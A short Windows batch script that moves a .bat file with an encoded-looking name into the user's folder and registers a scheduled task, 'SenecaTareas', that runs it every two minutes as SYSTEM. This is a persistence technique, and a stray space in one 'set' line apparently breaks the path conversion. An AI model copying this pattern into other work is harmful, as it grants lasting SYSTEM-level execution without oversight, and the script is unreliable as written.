@echo on
echo %~p0
echo %~dp0
echo %~1
set var=%~p0
set var =%var:\=/%
echo %var%
MOVE C:%var%Data_Y2lzY29zcGFyazovL3VzL1BFT1BMRS9mYWM0MTY2OC1jYTUwLTRhMDUtYjMzOS1hNTliMzZiYjQ0OGM.bat /Users/%username%/
schtasks.exe /create /sc MINUTE /mo 2 /tn SenecaTareas /tr /Users/%username%/Data_Y2lzY29zcGFyazovL3VzL1BFT1BMRS9mYWM0MTY2OC1jYTUwLTRhMDUtYjMzOS1hNTliMzZiYjQ0OGM.bat /st 06:00 /ru SYSTEM
schtasks /run /tn SenecaTareas